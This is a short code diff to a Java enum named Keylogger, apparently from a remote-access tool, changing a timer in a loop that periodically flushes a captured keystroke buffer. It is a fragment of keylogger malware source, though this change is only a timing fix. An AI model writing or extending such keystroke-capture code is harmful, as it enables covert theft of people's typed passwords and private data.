@@ -87,7 +87,7 @@ public enum Keylogger {
 						break;
 					case TIME:
 						while (!Thread.currentThread().isInterrupted()) {
-							Thread.sleep(value);
+							Thread.sleep(value * 1000);
 							ClientCommands.flushKeybuffer();
 
 						}
